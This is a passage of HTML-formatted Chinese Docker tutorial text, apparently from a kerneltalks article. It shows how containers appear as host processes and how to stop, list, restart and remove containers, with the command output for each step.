class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0bd653676040-4\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">15729</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0bd653676040-5\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">15730</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0bd653676040-6\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">15731</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0bd653676040-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0bd653676040-8\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># ps -ef |grep -i 15702</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0bd653676040-9\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15690</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0bd653676040-10\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">15729</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0bd653676040-11\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">15730</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0bd653676040-12\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">15731</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0bd653676040-13\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">15993</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15957</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">59</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">color</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">auto</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0bd653676040-14\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0055 seconds] -->\r\n<p>在第一个输出中，列出了容器产生的进程的列表。它包含了所有细节，包括用户号uid、进程号pid，父进程号ppid、开始时间、命令，等等。这里所有的进程号你都可以在宿主的进程表里搜索到。这就是我们在第二个命令里做得。这证明了容器确实是宿主系统中的进程。</p>\n<h3 id=\"toc_5\">如何停止 Docker 容器？</h3>\n<p>只需要 <code>stop</code> 命令！同样，它采用容器名称或 ID 作为参数。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7536da0c5787722550\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container stop cranky_cori\r\ncranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0c5787722550-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0c5787722550-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0c5787722550-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7536da0c5787722550-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container stop cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0c5787722550-2\"><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0c5787722550-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3 id=\"toc_6\">如何列出停止的或不活动的 Docker 容器？</h3>\n<p>现在我们停止了我们的容器，这时如果我们使用 <code>ls</code> 命令，它将不会出现在列表中。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7536da0c9104668374\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container ls\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0c9104668374-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0c9104668374-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0c9104668374-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7536da0c9104668374-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0c9104668374-2\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND             </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS               </span><span class=\"crayon-i\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0c9104668374-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>所以，在这种情况下，如果想要查看停止的或不活动的容器，你需要在 <code>ls</code> 命令里同时使用 <code>-a</code> 参数。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7536da0cc672898343\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS                     PORTS               NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   33 minutes ago      Exited (0) 2 minutes ago                       cranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0cc672898343-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0cc672898343-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0cc672898343-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0cc672898343-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7536da0cc672898343-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls -a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0cc672898343-2\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND              </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS                     </span><span class=\"crayon-e\">PORTS               </span><span class=\"crayon-e\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0cc672898343-3\"><span class=\"crayon-e\">c46f2e9e4690        </span><span class=\"crayon-i\">httpd</span><span class=\"crayon-h\">               </span><span class=\"crayon-s\">\"httpd-foreground\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">33</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago      </span><span class=\"crayon-e\">Exited</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago                       </span><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0cc672898343-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>有了 <code>-a</code> 参数，现在我们可以查看已停止的容器。注意这些容器的状态被标注为 已退出exited。既然容器只是一个进程，那么用“退出”比“停止”更合适！</p>\n<h3 id=\"toc_7\">如何（重新）启动 Docker 容器？</h3>\n<p>现在，我们来启动这个已停止的容器。这和运行一个容器有所区别。当你运行一个容器时，你将启动一个全新的容器。当你启动一个容器时，你将开始一个已经停止并保存了当时运行状态的容器。它将以停止时的状态重新开始运行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7536da0d0080275993\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks #  docker container start c46f2e9e4690\r\nc46f2e9e4690\r\n\r\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   35 minutes ago      Up 8 seconds        0.0.0.0:80-&gt;80/tcp   cranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0d0080275993-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0d0080275993-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0d0080275993-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0d0080275993-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0d0080275993-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0d0080275993-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0d0080275993-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7536da0d0080275993-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#  docker container start c46f2e9e4690</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0d0080275993-2\"><span class=\"crayon-e\">c46f2e9e4690</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0d0080275993-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0d0080275993-4\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls -a</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0d0080275993-5\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND              </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS                </span><span class=\"crayon-e\">NAMES</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0d0080275993-6\"><span class=\"crayon-e\">c46f2e9e4690        </span><span class=\"crayon-i\">httpd</span><span class=\"crayon-h\">               </span><span class=\"crayon-s\">\"httpd-foreground\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago      </span><span class=\"crayon-i\">Up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">seconds</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">0.0.0.0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">tcp   </span><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0d0080275993-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p></p>\n<h3 id=\"toc_8\">如何移除 Docker 容器？</h3>\n<p>我们使用 <code>rm</code> 命令来移除容器。你不可以移除运行中的容器。移除之前需要先停止容器。你可以使用 <code>-f</code> 参数搭配 <code>rm</code> 命令来强制移除容器，但并不推荐这么做。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7536da0d6410192699\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container rm cranky_cori\r\ncranky_cori\r\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0d6410192699-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0d6410192699-2\">2</div><div class=\"crayon-num\" 